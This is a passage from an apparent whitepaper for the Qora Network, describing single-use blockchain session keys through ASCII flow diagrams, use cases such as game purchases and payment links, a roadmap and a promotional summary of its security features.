│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │  Buy Sword   │  Player gets sword                                      │
│   │  50 QORA sent │  Game gets payment                                      │
│   └──────┬───────┘                                                          │
│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │  KEY DELETED │  Key no longer exists                                   │
│   └──────────────┘                                                          │
│                                                                             │
│                                                                             │
│   ACTION: Buy Armor (30 QORA)                                               │
│   ════════════════════════════                                              │
│                                                                             │
│   ┌──────────────┐                                                          │
│   │  Create NEW  │  max_amount: 30 QORA (different!)                        │
│   │  Key         │  recipient: game contract                               │
│   └──────┬───────┘                                                          │
│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │  Buy Armor   │                                                          │
│   │  30 QORA sent │                                                          │
│   └──────┬───────┘                                                          │
│          │                                                                  │
│          ▼                                                                  │
│   ┌──────────────┐                                                          │
│   │  KEY DELETED │                                                          │
│   └──────────────┘                                                          │
│                                                                             │
│                                                                             │
│   SECURITY BENEFIT:                                                         │
│   ═════════════════                                                         │
│                                                                             │
│   • Each purchase uses a DIFFERENT key                                     │
│   • Key is tailored to EXACT amount needed                                 │
│   • Key can ONLY go to game contract                                       │
│   • If game is hacked mid-purchase, only ONE purchase affected             │
│   • Player's wallet remains completely safe                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Payment Links

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                        PAYMENT LINK USE CASE                                │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SCENARIO: Send crypto to friend who doesn't have a wallet                │
│                                                                             │
│                                                                             │
│   STEP 1: Create Payment Link                                              │
│   ════════════════════════════                                              │
│                                                                             │
│   You create a single-use key:                                             │
│   {                                                                         │
│     max_uses: 1,                                                           │
│     max_amount: 100 QORA,                                                   │
│     allowed_recipient: "ANYONE" (claim address),                           │
│     expires: 7 days                                                        │
│   }                                                                         │
│                                                                             │
│   Generate link: https://qora.pay/claim/abc123                              │
│   Send to friend via text, email, etc.                                     │
│                                                                             │
│                                                                             │
│   STEP 2: Friend Claims Payment                                            │
│   ═════════════════════════════                                             │
│                                                                             │
│   Friend clicks link → Creates wallet → Claims 100 QORA                     │
│                                                                             │
│   ┌──────────────┐                                                          │
│   │ KEY DELETED  │  Link can NEVER be used again                           │
│   └──────────────┘                                                          │
│                                                                             │
│                                                                             │
│   SECURITY:                                                                 │
│   ══════════                                                                │
│                                                                             │
│   ✅ Link works exactly ONCE                                               │
│   ✅ Cannot claim twice (key deleted)                                      │
│   ✅ Cannot claim more than 100 QORA                                        │
│   ✅ Your wallet safe (only 100 QORA at risk)                               │
│   ✅ Link expires if not used                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Roadmap

### Phase 1: Core Protocol (Q1 2025)
- [x] Single-use key data structures
- [x] Create and execute functions
- [x] Automatic deletion on use
- [ ] Integration with Qora testnet
- [ ] Security audit

### Phase 2: WebAuthn Integration (Q2 2025)
- [ ] P-256 signature verification (via existing precompile)
- [ ] Browser wallet with WebAuthn
- [ ] Mobile SDK with biometric support

### Phase 3: Ecosystem (Q3-Q4 2025)
- [ ] Game SDK integration
- [ ] DeFi protocol integration
- [ ] Payment link service
- [ ] Hardware wallet support

---

## Conclusion

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│                         THE QORA DIFFERENCE                                  │
│                                                                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                                                                             │
│   EVERY OTHER BLOCKCHAIN:                                                   │
│   ═══════════════════════                                                   │
│                                                                             │
│   "Here's a session key. Use it multiple times."                           │
│                                                                             │
│   → Key exists for hours/days                                              │
│   → Can be stolen and reused                                               │
│   → Attack window: LARGE                                                   │
│                                                                             │
│                                                                             │
│   QORA:                                                                      │
│   ════                                                                      │
│                                                                             │
│   "Here's a key. Use it ONCE. Then it's gone."                             │
│                                                                             │
│   → Key exists for milliseconds                                            │
│   → Cannot be reused (deleted immediately)                                 │
│   → Attack window: MINIMAL                                                 │
│                                                                             │
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────────┐  │
│   │                                                                     │  │
│   │             1 KEY = 1 TRANSACTION = DELETED                        │  │
│   │                                                                     │  │
│   │             THIS IS THE FUTURE OF BLOCKCHAIN SECURITY              │  │
│   │                                                                     │  │
│   └─────────────────────────────────────────────────────────────────────┘  │
│                                                                             │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
Normal Mode (No Auth App)
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   WALLET                          BLOCKCHAIN                                │
│     │                                  │                                    │
│     │  1. Create Session Key           │                                    │
│     │  ───────────────────────────────►│                                    │
│     │                                  │ Store key (STATUS_ACTIVE)          │
│     │                                  │                                    │
│     │  2. Execute Transaction          │                                    │
│     │  ───────────────────────────────►│                                    │
│     │                                  │ Validate & Execute                 │
│     │                                  │                                    │
│     │                                  │ ████ DELETE KEY ████               │
│     │                                  │                                    │
│     │  3. Success                      │                                    │
│     │  ◄───────────────────────────────│                                    │
│     │                                  │                                    │
│                                                                             │
│   TOTAL TIME: ~200ms                                                        │
│   KEY LIFETIME: ~200ms                                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

Split Key Mode (With Auth App)

┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   WALLET              AUTH APP              BLOCKCHAIN                      │
│     │                    │                       │                          │
│     │  1. Create Split Session Key               │                          │
│     │  ─────────────────────────────────────────►│                          │
│     │                    │                       │ Store key (PENDING)      │
│     │                    │                       │                          │
│     │       Push Notification                    │                          │
│     │  ─────────────────►│                       │                          │
│     │                    │                       │                          │
│     │              User Approves                 │                          │
│     │              (Fingerprint)                 │                          │
│     │                    │                       │                          │
│     │                    │  2. Approve (Part 2)  │                          │
│     │                    │  ────────────────────►│                          │
│     │                    │                       │ Combine Parts            │
│     │                    │                       │ STATUS_ACTIVE            │
│     │                    │                       │                          │
│     │  3. Execute Transaction                    │                          │
│     │  ─────────────────────────────────────────►│                          │
│     │                    │                       │ Validate & Execute       │
│     │                    │                       │                          │
│     │                    │                       │ ████ DELETE KEY ████     │
│     │                    │                       │                          │
│     │  4. Success                                │                          │
│     │  ◄─────────────────────────────────────────│                          │
│                                                                             │
│   PENDING TIME: Up to 5 minutes                                             │
│   KEY LIFETIME: ~200ms after approval                                       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘

```
Security Features
5 Layers of Security

Single-Use Keys: Each key works for exactly ONE transaction
Auto-Delete: Keys are automatically deleted after use
Split Keys: Requires both wallet + auth app (optional)
Biometric: Auth app requires fingerprint/face ID
Expiration: Keys and pending transactions expire quickly

Attack Scenarios
AttackWithout SplitWith SplitSteal wallet1 tx loss (max)0 loss (need auth app)Steal phoneN/A0 loss (need wallet)Steal both1 tx loss (max)0 loss (need biometric)MitMKey deletedKeys combined on-chainMalware1 tx loss (max)User sees notification, can reject

---

*Qora Network — One Key. One Transaction. Zero Risk.*
